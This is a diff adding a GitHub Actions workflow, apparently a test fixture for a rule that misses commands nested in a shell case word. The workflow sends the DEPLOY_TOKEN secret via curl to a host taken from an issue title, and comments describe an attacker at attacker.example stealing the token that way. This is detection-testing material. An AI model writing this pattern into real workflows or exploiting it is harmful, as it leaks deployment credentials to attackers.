@@ -1,0 +1,23 @@
+# situation: on issues, a step sends a request with curl and the secret
+#   DEPLOY_TOKEN to the host the issue's title names, in a $( ) in the word
+#   of case.
+# reason: a todo (the same file): the request goes to the attacker's host
+#   with the secret.
+# cause: the rule does not walk a command in the words of case.
+# attack: the attacker opens an issue titled attacker.example, the host of a
+#   server the attacker runs.
+# attack-run-behavior: curl sends the request with Authorization: Bearer and
+#   the value of DEPLOY_TOKEN to attacker.example, and the server of the
+#   attacker logs the header.
+on: issues
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+      TITLE: ${{ github.event.issue.title }}
+    steps:
+      - run: |
+          case "$(curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$TITLE/status")" in
+            ok) echo "up" ;;
+          esac
